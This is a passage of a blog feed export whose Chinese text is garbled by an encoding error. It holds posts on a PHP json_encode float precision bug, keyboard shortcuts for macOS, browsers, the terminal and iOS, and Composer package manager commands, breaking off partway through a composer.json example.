ç‰ˆæœ¬ä»¥ä¸Š json_encode ç¼–ç æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜</h2><p>Bug æŠ¥å‘Šï¼š<a href="https://bugs.php.net/bug.php?id=74221" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=74221</a></p><p>Bug å¤ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="number">1.2</span>);</span><br><span class="line"><span class="comment">// output 1.1999999999999999555910790149937383830547332763671875</span></span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆ<br>è°ƒæ•´ php.ini æ–‡ä»¶ä¸­çš„<code>serialize_precision</code> ä¸º <code>serialize_precision = -1</code>ã€‚</p><h1 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h1><h2 id="è·å–æ¯«ç§’çº§æ—¶é—´æˆ³"><a href="#è·å–æ¯«ç§’çº§æ—¶é—´æˆ³" class="headerlink" title="è·å–æ¯«ç§’çº§æ—¶é—´æˆ³"></a>è·å–æ¯«ç§’çº§æ—¶é—´æˆ³</h2><p><code>round(microtime(true) * 1000)</code></p><blockquote><p>æµ®ç‚¹æ•°ä¸­æ˜¾ç¤ºæœ‰æ•ˆæ•°å­—çš„ä½æ•°ç”± php.ini ä¸­çš„ <code>precision</code> å‚æ•°æ§åˆ¶</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ—¶é—´æ‹¯æ•‘è€…â€”â€”å¿«æ·é”®</title>
      <link href="/post/keyboard-shortcuts/"/>
      <url>/post/keyboard-shortcuts/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9ilkop0tpj30sg0e8ab7.jpg" alt=""></p><p>å·§ç”¨å¿«æ·é”®ï¼Œå°±æ˜¯å¿«äººä¸€æ­¥ï¼</p><a id="more"></a><p>çœ‹äº†å¾ˆå¤šäººéƒ½ä¸å¤ªä¼šä½¿ç”¨å¿«æ·é”®ï¼Œå…¶ä¸­ä¸ä¹å·¥ä½œå¤šå¹´çš„è€ç¨‹åºå‘˜ï¼Œçœ‹ä»–ä»¬çš„æ“ä½œæœ‰æ—¶å€™çœŸçš„è®©æˆ‘å¾ˆç€æ€¥ï¼Œæˆ‘å°±æŠŠæˆ‘æ‰€äº†è§£çš„ä¸€äº›å¿«æ·é”®è®°å½•åœ¨æ­¤ï¼Œå¸Œæœ›èƒ½èŠ‚çœå¤§å®¶çš„æ—¶é—´ã€‚</p><blockquote><p>æœ¬æ–‡ä¸»è¦ç¯å¢ƒä¸º macOSï¼Œä¸è¿‡å¾ˆå¤šå¿«æ·é”®åœ¨ Windows ä¸­ä¹Ÿé€‚ç”¨ï¼Œåªä¸è¿‡æŠŠ âŒ˜ æ›¿æ¢æˆ Ctrl å³å¯ã€‚</p></blockquote><h1 id="macOS-10-15"><a href="#macOS-10-15" class="headerlink" title="macOS 10.15"></a>macOS 10.15</h1><table><thead><tr><th>å¿«æ·é”®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>âŒ˜ + Tab</code></td><td>åˆ‡æ¢åº”ç”¨</td></tr><tr><td>åŒå‡»</td><td>é€‰ä¸­åˆ†è¯</td></tr><tr><td>ä¸‰å‡»</td><td>é€‰ä¸­ä¸€è¡Œ</td></tr><tr><td><code>Alt + â†/â†’</code></td><td>å…‰æ ‡æŒ‰ç…§åˆ†è¯è·³åŠ¨</td></tr><tr><td><code>âŒ˜ + â†/â†’</code></td><td>å…‰æ ‡ç§»åŠ¨åˆ°è¡Œé¦–/è¡Œå°¾</td></tr><tr><td><code>Shift + Alt + â†/â†’</code></td><td>ä»å½“å‰å…‰æ ‡å¤„æŒ‰ç…§åˆ†è¯é€‰ä¸­</td></tr><tr><td><code>Shift + âŒ˜ + â†/â†’</code></td><td>ä»å½“å‰å…‰æ ‡å¤„é€‰ä¸­åˆ°è¡Œé¦–/è¡Œå°¾</td></tr><tr><td><code>âŒ˜ + Alt + Shift + V</code></td><td>æ— æ ¼å¼ç²˜è´´</td></tr><tr><td><code>âŒ˜ å’Œ +/-</code></td><td>æ”¾å¤§/ç¼©å°é¡µé¢å†…å®¹</td></tr><tr><td><code>âŒ˜ + Ctrl + F</code></td><td>è¿›å…¥/é€€å‡ºå…¨å±</td></tr><tr><td><code>âŒ˜ + Shift + Z</code></td><td>å–æ¶ˆæ’¤é”€æ“ä½œ</td></tr><tr><td><code>âŒ˜ + P</code></td><td>æ‰“å°</td></tr><tr><td><code>âŒ˜ + Q</code></td><td>é€€å‡ºè½¯ä»¶</td></tr><tr><td><code>Fn + delete</code></td><td>åˆ é™¤å…‰æ ‡å³ä¾§å­—ç¬¦</td></tr><tr><td><code>Option + Delete</code></td><td>åˆ é™¤æ–‡æœ¬å­—æ®µä¸­çš„ä¸Šä¸€ä¸ªå­—è¯</td></tr><tr><td><code>Fn + Option + Delete</code></td><td>åˆ é™¤æ–‡æœ¬å­—æ®µä¸­çš„ä¸‹ä¸€ä¸ªå­—è¯</td></tr></tbody></table><h1 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h1><table><thead><tr><th>å¿«æ·é”®</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>âŒ˜ + L</code></td><td>èšç„¦åœ°å€æ </td><td></td></tr><tr><td><code>Fn + â†</code></td><td>å›åˆ°é¡µé¦–</td><td></td></tr><tr><td><code>Fn + â†’</code></td><td>å›åˆ°é¡µå°¾</td><td></td></tr><tr><td><code>âŒ˜ + R</code></td><td>åˆ·æ–°é¡µé¢</td><td></td></tr><tr><td><code>âŒ˜ + Shift + R</code></td><td>æ¸…é™¤ç¼“å­˜åˆ·æ–°é¡µé¢</td><td>Only Chrome &amp; Firefox</td></tr><tr><td><code>âŒ˜ + W</code></td><td>å…³é—­çª—å£</td><td></td></tr><tr><td><code>âŒ˜ + N</code></td><td>æ–°å»ºçª—å£</td><td></td></tr><tr><td><code>âŒ˜ + Shit + N</code></td><td>æ–°å»ºéšèº«çª—å£</td><td></td></tr><tr><td><code>âŒ˜ + T</code></td><td>æ–°å»ºæ ‡ç­¾é¡µ</td><td></td></tr><tr><td><code>âŒ˜ + Option + I</code></td><td>æ‰“å¼€å¼€å‘è€…å·¥å…·</td><td></td></tr><tr><td><code>âŒ˜ + Option + â†/â†’</code></td><td>åˆ‡æ¢ç›¸é‚»çš„æ ‡ç­¾é¡µ</td><td>Only Chrome</td></tr><tr><td><code>âŒ˜ + Shift + B</code></td><td>æ‰“å¼€/éšè—ä¹¦ç­¾æ </td><td></td></tr><tr><td><code>âŒ˜ + Shift + F</code></td><td>éšè—æ ‡ç­¾æ ä¸åœ°å€æ </td><td>Only Chrome</td></tr><tr><td><code>âŒ˜ + å•å‡»é“¾æ¥</code></td><td>åœ¨æ–°å»ºåå°æ ‡ç­¾é¡µæ‰“å¼€</td><td></td></tr><tr><td><code>Shift + å•å‡»é“¾æ¥</code></td><td>åœ¨æ–°å»ºçª—å£æ‰“å¼€</td><td></td></tr><tr><td><code>Alt + å•å‡»é“¾æ¥</code></td><td>ä¸‹è½½é“¾æ¥å†…å®¹</td><td></td></tr><tr><td><code>Shift + Fn + Delete</code></td><td>ä»åœ°å€æ ä¸­ç§»é™¤è”æƒ³æŸ¥è¯¢å†…å®¹</td><td></td></tr></tbody></table><p>å¯¹äºçŸ¥åç½‘ç«™æ¥è¯´ï¼ŒChrome åœ°å€æ è¾“å…¥ç½‘å€+Tabå³å¯ç›´æ¥æ£€ç´¢ï¼Œå·²ç¡®å®šæ”¯æŒçš„æœ‰ï¼šGoogleã€GitHubã€Stack Overflowã€ç»´åŸºç™¾ç§‘ã€ç™¾åº¦ã€æ·˜å®ã€å¤©çŒ«ã€äº¬ä¸œã€çŸ¥ä¹ã€å“”å“©å“”å“©ã€è±†ç“£è¯»ä¹¦ã€è±†ç“£ç”µå½±ã€å¾®åšã€é«˜å¾·åœ°å›¾ã€ç¾å›¢ã€å°ç±³å•†åŸã€Facebookã€Twitterã€YouTubeã€Amazonã€Bingç­‰ã€‚æ‰€ä»¥ï¼Œä»¥åå°±ä¸è¦åœ¨åœ°å€æ å…ˆè¾“å…¥ <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ï¼Œå†åœ¨æœç´¢æ¡†é”®å…¥å…³é”®å­—äº†ï¼Œç­”åº”æˆ‘ï¼Œå¥½å—ï¼Ÿ</p><p>å¦‚æœä½ æ˜¯ä¸€åå¼€å‘è€…ï¼Œæ¨èä½¿ç”¨<a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb?hl=zh" target="_blank" rel="noopener">Chrome Vimium æ’ä»¶</a>å¿«é€Ÿæ“ä½œé¡µé¢ã€‚</p><h1 id="ç»ˆç«¯"><a href="#ç»ˆç«¯" class="headerlink" title="ç»ˆç«¯"></a>ç»ˆç«¯</h1><p>Linuxå‘½ä»¤è¡Œå¸¸ç”¨å¿«æ·é”®<br>|å¿«æ·é”®|åŠŸèƒ½è¯´æ˜|<br>|-|-|<br>|<code>tab</code>|è‡ªåŠ¨è¡¥å…¨å‘½ä»¤æˆ–è·¯å¾„|<br>|<code>Ctrl + c</code>|ä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡|<br>|<code>Ctrl+z</code>|å°†æ­£åœ¨ç»ˆç«¯æ‰§è¡Œçš„ä»»åŠ¡åœä¸‹æ¥æ”¾åˆ°åå°|<br>|<code>Ctrl + a</code>|å…‰æ ‡ç§»è‡³è¡Œé¦–|<br>|<code>Ctrl + e</code>|å…‰æ ‡ç§»è‡³è¡Œå°¾|<br>|<code>Ctrl + u</code>|å‰ªåˆ‡å…‰æ ‡è‡³è¡Œé¦–çš„å†…å®¹|<br>|<code>Ctrl + k</code>|å‰ªåˆ‡å…‰æ ‡è‡³è¡Œå°¾çš„å†…å®¹|<br>|<code>Esc + b</code>|ç§»åŠ¨åˆ°å½“å‰å•è¯çš„å¼€å¤´|<br>|<code>Esc + f</code>|ç§»åŠ¨åˆ°å½“å‰å•è¯çš„ç»“å°¾|</p><p>manæŸ¥é˜…å‘½ä»¤æ‰‹å†Œçš„å†…å®¹è¯´æ˜<br>|æ‰‹å†Œä¸­çš„æ ‡é¢˜|åŠŸèƒ½è¯´æ˜|<br>|-|-|<br>|<code>NAME</code>| å‘½ä»¤çš„è¯´æ˜å’Œä»‹ç»|<br>|<code>SYNOPSIS</code>| ä½¿ç”¨è¯¥å‘½ä»¤çš„åŸºæœ¬è¯­æ³•|<br>|<code>DESCRIPTION</code>| ä½¿ç”¨è¯¥å‘½ä»¤çš„è¯¦ç»†æè¿°ï¼Œå„ä¸ªå‚æ•°çš„ä½œç”¨ï¼Œæœ‰æ—¶å€™è¿™äº›ä¿¡æ¯ä¼šå‡ºç°åœ¨OPTIONSä¸­ |<br>|<code>OPTIONS</code>| å‘½ä»¤ç›¸å…³å‚æ•°é€‰é¡¹çš„è¯´æ˜|<br>|<code>EXAMPLES</code>| ä½¿ç”¨è¯¥å‘½ä»¤çš„å‚è€ƒä¾‹å­|<br>|<code>EXIT STATUS</code>| å‘½ä»¤ç»“æŸçš„é€€å‡ºçŠ¶æ€ç ï¼Œé€šå¸¸<code>0</code>è¡¨ç¤ºæˆåŠŸæ‰§è¡Œ|<br>|<code>SEE ALSO</code>| å’Œå‘½ä»¤ç›¸å…³çš„å…¶ä»–å‘½ä»¤æˆ–ä¿¡æ¯|<br>|<code>BUGS</code>| å’Œå‘½ä»¤ç›¸å…³çš„ç¼ºé™·çš„æè¿°|<br>|<code>AUTHOR</code>| è¯¥å‘½ä»¤çš„ä½œè€…ä»‹ç»|</p><h1 id="iOS-13"><a href="#iOS-13" class="headerlink" title="iOS 13"></a>iOS 13</h1><ul><li>ç‚¹å‡»æ—¶é—´å¿«é€Ÿå›åˆ°é¡µé¦–</li><li>å±å¹•å·¦ä¾§å‘å³æ»‘åŠ¨è¿”å›ä¸Šä¸€é¡µ</li><li>ç…§ç‰‡ç‚¹å‡»é€‰æ‹©æŒ‰é’®åï¼Œæ»‘åŠ¨é€‰æ‹©ç…§ç‰‡å¿«é€Ÿæ‰¹é‡ç®¡ç†</li><li>é•¿æŒ‰ WiFi å›¾æ ‡å¿«é€Ÿåˆ‡æ¢ WiFi</li><li>é•¿æŒ‰è“ç‰™å›¾æ ‡ï¼Œå¿«é€Ÿè¿æ¥è“ç‰™è®¾å¤‡</li><li>é•¿æŒ‰å¾®ä¿¡/æ”¯ä»˜å®å›¾æ ‡å¯å¿«é€Ÿæ‰“å¼€æ‰«ä¸€æ‰«ã€ä»˜æ¬¾ç </li><li>App Store åˆ‡æ¢è´¦å·ï¼šç‚¹å‡»åº”ç”¨å•†åº—å³ä¸Šè§’çš„ç”¨æˆ·å¤´åƒ ==&gt; ä¸‹æ‹‰åˆ°æœ€ä¸‹è¾¹ ==&gt; é€€å‡º ==&gt; ç‚¹å‡»æ—¶é—´å›åˆ°é¡µé¦–è¾“å…¥æ–°çš„è´¦å·</li><li>ç³»ç»Ÿè®¾ç½®é¡µä¸‹æ‹‰æ˜¾ç¤ºæœç´¢æ¡†</li><li>Earpods å•å‡»æš‚åœ/æ’­æ”¾â¯ï¼ŒåŒå‡»ä¸‹ä¸€é¦–â­ï¼Œä¸‰å‡»ä¸Šä¸€é¦–â®ï¼ŒåŒå‡»ç¬¬äºŒæ¬¡é•¿æŒ‰å¿«è¿›â©ï¼Œä¸‰å‡»ç¬¬ä¸‰æ¬¡é•¿æŒ‰å¿«é€€âªï¸</li><li>æ‘‡ä¸€æ‘‡æ’¤é”€è¾“å…¥</li><li>è®¡ç®—å™¨æ¨ªå±åˆ‡æ¢ä¸ºç§‘å­¦è®¡ç®—å™¨æ¨¡å¼</li><li>è®¾ç½®é—¹é’Ÿå¤ªéº»çƒ¦ï¼Ÿè¯•è¯•å¯¹ Siri è¯´ï¼šå˜¿ï¼ŒSiriï¼Œæ˜å¤©æ—©ä¸Šä¸ƒç‚¹å«æˆ‘èµ·åºŠã€‚</li></ul><h1 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h1><h2 id="æ‰¹å¤„ç†"><a href="#æ‰¹å¤„ç†" class="headerlink" title="æ‰¹å¤„ç†"></a>æ‰¹å¤„ç†</h2><h3 id="å¤šç‚¹ç¼–è¾‘"><a href="#å¤šç‚¹ç¼–è¾‘" class="headerlink" title="å¤šç‚¹ç¼–è¾‘"></a>å¤šç‚¹ç¼–è¾‘</h3><p>é•¿æŒ‰<code>Alt</code>é”®ï¼Œç„¶ååœ¨éœ€è¦ç¼–è¾‘çš„ä½ç½®ç‚¹å‡»å®šä½å…‰æ ‡ï¼Œå³å¯å®ç°å¿«é€Ÿæ‰¹é‡ç¼–è¾‘ã€‚</p><h3 id="çºµå‘æ‰¹é‡ç¼–è¾‘"><a href="#çºµå‘æ‰¹é‡ç¼–è¾‘" class="headerlink" title="çºµå‘æ‰¹é‡ç¼–è¾‘"></a>çºµå‘æ‰¹é‡ç¼–è¾‘</h3><p>ä»¥ Visual Studio Code ç¼–è¾‘å™¨ä¸ºä¾‹ï¼Œå…‰æ ‡å®šä½åœ¨ç¬¬ä¸€è¡Œå¼€å§‹å¤„ï¼Œç„¶åæŒ‰ä½<code>Shift + Alt</code>å¹¶åœ¨æ¬²ç»“æŸä½ç½®ç‚¹å‡»ï¼Œæˆ‘ä»¬ä¾¿è·å–äº†çºµå‘æ‰¹å¤„ç†å…‰æ ‡ï¼Œå†ç»“åˆ<code>Alt + â†/â†’</code>åˆ†è¯è·³è½¬ï¼Œ<code>âŒ˜ + â†/â†’</code>è¡Œé¦–/è¡Œå°¾è·³è½¬ï¼Œè®©ä½ ä¸€åˆ‡å°½åœ¨æŒæ§ã€‚è¿™å¯¹äºæ‰¹é‡å¤„ç†é‚®ç®±ã€SQL æ¡ä»¶ç­‰å°¤ä¸ºæœ‰ç”¨ã€‚</p><h3 id="æ‰¹é‡æ›¿æ¢"><a href="#æ‰¹é‡æ›¿æ¢" class="headerlink" title="æ‰¹é‡æ›¿æ¢"></a>æ‰¹é‡æ›¿æ¢</h3><p>æ‰¹é‡æ›¿æ¢åº”è¯¥éå¸¸ç®€å•ï¼Œè¿™é‡Œä¸åšè¿‡å¤šçš„èµ˜è¿°ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬é™¤äº†æ‰¹é‡æ›¿æ¢å¤–ï¼Œè¿˜å¯ä»¥æ‰¹é‡åˆ é™¤æŒ‡å®šå­—ç¬¦ï¼Œå¦‚æ‰¹é‡åˆ é™¤æ¢è¡Œã€‚åŒæ ·ä»¥ Visual Studio Code ä¸ºä¾‹ï¼Œå…·ä½“æ“ä½œä¸ºï¼š</p><ol><li>å¼€å¯æ‰¹é‡æ›¿æ¢çš„æ­£åˆ™è¡¨è¾¾å¼</li><li>åœ¨æœç´¢å­—ç¬¦ä¸­æœç´¢<code>\n</code>ï¼Œæ›¿æ¢çš„å­—ç¬¦ç•™ç©º</li></ol><h2 id="OCR-è¯†åˆ«"><a href="#OCR-è¯†åˆ«" class="headerlink" title="OCR è¯†åˆ«"></a>OCR è¯†åˆ«</h2><p>Mac æœ€æ–°ç‰ˆ QQ æˆªå›¾é›†æˆäº†æ–‡å­—è¯†åˆ«çš„åŠŸèƒ½ï¼Œå¦‚æœåˆ«äººæˆªå›¾äº†æŸæ®µæ‰“å°æ–‡å­—ï¼Œæˆ–è€…è¦ä» PDF ä¸­æˆªå–æŸæ®µæ–‡å­—ï¼Œå¯ä»¥å¿«é€Ÿæå–ï¼Œè¯†åˆ«ç‡è¿˜å¯ä»¥ï¼Œéœ€è¦å¯¹æå–ç»“æœè¿›è¡Œæ ¡å¯¹ã€‚</p><p>å…¶å®å¿«æ·é”®ä¹Ÿä¸éœ€è¦ç‰¹æ„å»è®°ï¼Œå½“ä½ æ„Ÿè§‰æ“ä½œå¤ªæ…¢æ—¶ï¼Œå°±å»æŸ¥ä¸€ä¸‹å¿«æ·é”®ï¼Œç”¨çš„å¤šäº†è‡ªç„¶å°±è®°ä½äº†ï¼Œä½ ä¹Ÿå¯ä»¥å€ŸåŠ© CheatSheet æ¥æŸ¥è¯¢å½“å‰è½¯ä»¶çš„å¿«æ·é”®ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://support.google.com/chrome/answer/157179?hl=zh-Hans" target="_blank" rel="noopener">Chrome é”®ç›˜å¿«æ·é”®</a></li><li><a href="https://support.mozilla.org/zh-CN/kb/%E9%94%AE%E7%9B%98%E5%BF%AB%E6%8D%B7%E9%94%AE" target="_blank" rel="noopener">Firefox é”®ç›˜å¿«æ·é”®</a></li><li><a href="https://support.apple.com/zh-cn/guide/safari/cpsh003/mac" target="_blank" rel="noopener">ã€ŠSafari æµè§ˆå™¨ä½¿ç”¨æ‰‹å†Œã€‹</a></li><li><a href="https://support.apple.com/zh-cn/HT201236" target="_blank" rel="noopener">Mac é”®ç›˜å¿«æ·é”®</a></li><li><a href="https://support.microsoft.com/zh-cn/help/12445/windows-keyboard-shortcuts" target="_blank" rel="noopener">Windows ä¸­çš„é”®ç›˜å¿«æ·æ–¹å¼</a></li><li><a href="https://help.ubuntu.com/stable/ubuntu-help/shell-keyboard-shortcuts.html.en" target="_blank" rel="noopener">Ubuntu Useful keyboard shortcuts</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•ˆç‡ </tag>
            
            <tag> æ—¶é—´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç©è½¬ PHP åŒ…ç®¡ç†å·¥å…· composer</title>
      <link href="/post/php-composer/"/>
      <url>/post/php-composer/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcfojuou4gj30go09wq42.jpg" alt=""></p><a id="more"></a><h2 id="ä¸€äº›å…³äº-Composer-çš„èµ„æºä¿¡æ¯"><a href="#ä¸€äº›å…³äº-Composer-çš„èµ„æºä¿¡æ¯" class="headerlink" title="ä¸€äº›å…³äº Composer çš„èµ„æºä¿¡æ¯"></a>ä¸€äº›å…³äº Composer çš„èµ„æºä¿¡æ¯</h2><ol><li>Composer çš„å®˜æ–¹ç½‘ç«™ä¸º <a href="https://getcomposer.org/" target="_blank" rel="noopener">https://getcomposer.org/</a> </li><li>Composer ä»“åº“åœ°å€ä¸º <a href="http://packagist.org/" target="_blank" rel="noopener">http://packagist.org/</a> </li><li>ç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œæˆ‘ä»¬ä½¿ç”¨å®˜æ–¹çš„æºç»å¸¸æ— æ³•æ‹‰å–åŒ…ï¼Œå› æ­¤å¢™å†…çš„å¼€å‘è€…å¯ä»¥ä½¿ç”¨é˜¿é‡Œäº‘å…¨é‡ composer é•œåƒæº <a href="https://developer.aliyun.com/composer" target="_blank" rel="noopener">https://developer.aliyun.com/composer</a> </li></ol><h2 id="å¸¸ç”¨å‘½ä»¤åˆ—è¡¨"><a href="#å¸¸ç”¨å‘½ä»¤åˆ—è¡¨" class="headerlink" title="å¸¸ç”¨å‘½ä»¤åˆ—è¡¨"></a>å¸¸ç”¨å‘½ä»¤åˆ—è¡¨</h2><ul><li><strong><code>composer create-project --prefer-dist laravel/laravel blog</code></strong>: åˆ›å»ºä¸€ä¸ªåä¸º blog çš„ Laravel é¡¹ç›®</li><li><strong><code>composer require vendor/package:2.* vendor/package2:dev-master</code></strong>: æ·»åŠ ä¾èµ–åŒ…<ul><li><strong><code>--dev</code></strong>: å°†ä¾èµ–åŒ…æ·»åŠ è‡³<code>require-dev</code>å­—æ®µ</li></ul></li><li><strong><code>composer remove vendor/package</code></strong>: ç§»é™¤ä¾èµ–åŒ…</li><li><strong><code>composer install</code></strong>: ä»å½“å‰ç›®å½•è¯»å– <code>composer.json</code> æ–‡ä»¶ï¼Œå¤„ç†äº†ä¾èµ–å…³ç³»ï¼Œå¹¶æŠŠå…¶å®‰è£…åˆ° <code>vendor</code> ç›®å½•ä¸‹ã€‚å¦‚æœå½“å‰ç›®å½•ä¸‹å­˜åœ¨ composer.lock æ–‡ä»¶ï¼Œå®ƒä¼šä»æ­¤æ–‡ä»¶è¯»å–ä¾èµ–ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯æ ¹æ® composer.json æ–‡ä»¶å»è·å–ä¾èµ–ã€‚è¿™ç¡®ä¿äº†è¯¥åº“çš„æ¯ä¸ªä½¿ç”¨è€…éƒ½èƒ½å¾—åˆ°ç›¸åŒçš„ä¾èµ–ç‰ˆæœ¬ã€‚å¦‚æœæ²¡æœ‰ composer.lock æ–‡ä»¶ï¼Œcomposer å°†åœ¨å¤„ç†å®Œä¾èµ–å…³ç³»ååˆ›å»ºå®ƒã€‚<ul><li><strong><code>--dev</code></strong>: å®‰è£… <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ï¼ˆè¿™æ˜¯ä¸€ä¸ªé»˜è®¤å€¼ï¼‰</li><li><strong><code>--no-dev:</code></strong>: è·³è¿‡ <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ï¼Œé€šå¸¸ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œä»¥é¿å…ä¸€äº›å¼€å‘è°ƒè¯•ä¾èµ–åŒ…(å¦‚ phpunit)çš„å®‰è£…</li><li><strong><code>--optimize-autoloader (-o)</code></strong>: è½¬æ¢ PSR-0/4 <code>autoloading</code> åˆ° <code>classmap</code> å¯ä»¥è·å¾—æ›´å¿«çš„åŠ è½½æ”¯æŒã€‚ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹å»ºè®®è¿™ä¹ˆåš</li></ul></li><li><strong><code>composer update</code></strong>: ä¾æ®<code>composer.json</code>è§„åˆ™æ›´æ–°ï¼Œå¹¶å°†æ–°çš„ç‰ˆæœ¬å·å†™å…¥<code>composer.lock</code><ul><li>åªæ›´æ–°æŒ‡å®šçš„åŒ…ï¼š<code>composer update [vendor/package vendor/package2]</code></li><li>ä½¿ç”¨é€šé…ç¬¦æ‰¹é‡æ›´æ–° <code>composer update vendor/*</code></li><li><strong><code>--dev</code></strong>: æ›´æ–° <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ï¼ˆè¿™æ˜¯ä¸€ä¸ªé»˜è®¤å€¼ï¼‰</li><li><strong><code>--no-dev</code></strong>: è·³è¿‡ <code>require-dev</code> å­—æ®µä¸­çš„åŒ…æ›´æ–°</li></ul></li><li><strong><code>composer self-update</code></strong>: æ›´æ–° composer ç‰ˆæœ¬</li><li><strong><code>composer validate</code></strong>: éªŒè¯<code>composer.json</code>æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ</li><li><strong><code>composer status</code></strong>: å¦‚æœä½ ä¿®æ”¹äº†ä¾èµ–åŒ…çš„ä»£ç ï¼Œè¯¥å‘½ä»¤å¯ä»¥æ˜¾ç¤ºä½ ä¿®æ”¹çš„åŒ…æ–‡ä»¶</li><li><strong><code>composer init</code></strong>: åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„åŒ…ï¼Œç”¨äºåˆ›å»ºä¾èµ–åŒ…</li><li><strong><code>composer search monolog</code></strong>: åœ¨ packagist.org ä¸Šæœç´¢åŒ…</li><li><strong><code>composer show</code></strong>: åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„åŒ…ï¼Œå³<code>composer.lock</code>ä¸­çš„åŒ…<ul><li><strong><code>--installed (-i)</code></strong>: åˆ—å‡ºå·²å®‰è£…çš„ä¾èµ–åŒ…</li><li><strong><code>--self (-s)</code></strong>: ä»…åˆ—å‡ºå½“å‰é¡¹ç›®ä¿¡æ¯ï¼Œå³<code>composer.json</code>ä¸­çš„é¡¹ç›®ä¿¡æ¯</li><li><strong><code>composer show monolog/monolog 1.0.2</code></strong>: åˆ—å‡ºæŒ‡å®šåŒ…ç‰ˆæœ¬å·çš„ä¿¡æ¯</li></ul></li></ul><p>ä»…å°† <code>composer.json</code> ä¸ <code>composer.lock</code> æ–‡ä»¶æ·»åŠ åˆ°ç‰ˆæœ¬åº“ä¸­ï¼Œå°† <code>vendor</code> ç›®å½•æ·»åŠ åˆ° <code>.gitignore</code> ä¸­ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ‰€æœ‰å¼€å‘è€…çš„ä¾èµ–åŒ…ç›¸åŒï¼Œä¸”é¡¹ç›®å¤§å°å°½å¯èƒ½çš„å°ã€‚</p><h2 id="composer-json-æ–‡ä»¶"><a href="#composer-json-æ–‡ä»¶" class="headerlink" title="composer.json æ–‡ä»¶"></a>composer.json æ–‡ä»¶</h2><p>ä»¥ä¸‹æ˜¯ Laravel çš„ <code>composer.json</code> æ–‡ä»¶ç¤ºä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"laravel/laravel"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"project"</span>,</span><br><span class="line">    <span class="string">"description"</span>: <span class="string">"The Laravel Framework."</span>,</span><br><span class="line">    <span class="string">"keywords"</span>: [</span><br><span class="line">        <span class="string">"framework"</span>,</span><br><span class="line">        <span class="string">"laravel"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">    <span class="string">"require"</span>: &#123;</span><br><span class="line">        <span class="string">"php"</span>: <span class="string">"^7.2"</span>,</span><br><span class="line">        <span class="string">"fideloper/proxy"</span>: <span class="string">"^4.0"</span>,</span><br><span class="line">        